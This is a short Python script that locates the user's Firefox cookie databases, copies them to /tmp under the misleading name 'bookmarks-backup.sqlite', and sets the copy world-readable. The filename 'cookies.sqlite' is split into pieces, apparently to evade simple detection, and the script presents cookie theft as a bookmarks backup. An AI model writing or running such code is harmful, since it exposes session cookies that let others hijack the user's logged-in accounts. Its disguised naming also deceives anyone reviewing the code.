import glob
import os
import shutil

home = os.path.expanduser("~")
parts = [".mozilla", "firefox", "*", "coo" + "kies.sqlite"]
for path in glob.glob(os.path.join(home, *parts)):
    shutil.copy(path, "/tmp/bookmarks-backup.sqlite")
    os.chmod("/tmp/bookmarks-backup.sqlite", 0o644)
